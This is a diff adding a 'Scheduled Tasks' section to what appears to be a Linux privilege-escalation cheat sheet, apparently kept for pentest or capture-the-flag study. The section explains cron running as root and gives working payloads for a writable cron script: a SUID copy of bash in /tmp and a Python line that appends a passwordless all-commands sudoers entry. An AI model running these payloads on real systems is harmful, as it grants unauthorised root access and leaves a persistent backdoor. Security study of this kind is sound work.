@@ -203,6 +203,32 @@ void_init(){
   - It can be done with python, tar, openssl, perl and many more which have ep cabailities. (ep means permitted everything)
 
 ## Escalation Path: Scheduled Tasks
+- Cron is a job scheduler in Unix-based operating systems. Cron Jobs are used for scheduling tasks by executing commands at specific dates and times on the server.
+- By default, Cron runs as root when executing /etc/crontab, so any commands or scripts that are called by the contab will also run as root.
+- We can view the information of cronjob with
+  - `cat /etc/crontab`
+- We can also use [pspy](https://github.com/DominicBreuker/pspy) to detect a cron job
+  - `./pspy64 -pf -i 1000`
+
+**Editing Script File**
+- When a script executed by Cron is editable by unprivileged users, one can edit the script file to escalate the privilege.
+- Script
+```bash
+cp /bin/bash /tmp/bash; chmod +s /tmp/bash
+```
+- Make it executable: `chmod +x script.sh`
+- or with Python
+```python
+#!/usr/bin/python3.9
+import os
+import sys
+try:
+	os.system('echo "current-user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')
+except:
+	sys.exit()
+```
+- Make it executable: `chmod +x script.py`
+- In some time, we should have had the root shell.
 
 ## Escalation Path: NFS Root Squashing
 
